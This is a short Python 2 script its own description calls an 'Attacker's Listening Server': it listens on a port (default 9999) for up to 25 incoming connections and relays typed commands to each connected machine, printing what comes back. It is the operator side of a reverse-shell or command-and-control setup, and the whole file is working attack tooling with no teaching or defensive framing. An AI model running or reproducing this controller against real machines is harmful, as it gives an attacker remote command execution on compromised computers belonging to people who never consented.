#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import socket
import argparse
import threading


clients = {}


def client_serve(client):
    try:
        print 'Enter a command to execute: '
        command = sys.stdin.read()
        client.send(command)

        while True:
            # Wait for data from listener
            print client.recv(4096)

            # Wait for more input
            command = raw_input('')
            command += '\n'

            client.send(command)

    except:
        print 'Client closed the connection'
        pass


def server_listen(port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(('0.0.0.0', port))
    listener.listen(25)  # Max. clients

    print 'Server listening on port %s...' % port

    while True:
        client, addr = listener.accept()
        print 'Incoming connection from %s:%d' % (addr[0], addr[1])
        clients[addr[0]] = client
        client_serve_thread = threading.Thread(target=client_serve, args=(client,))
        client_serve_thread.start()


def main():
    parser = argparse.ArgumentParser('Attacker\'s Listening Server')
    parser.add_argument('-p', '--port', type=int, help='The port number to connext with', default=9999)

    args = parser.parse_args()

    server_listen(args.port)


if __name__ == '__main__':
    main()
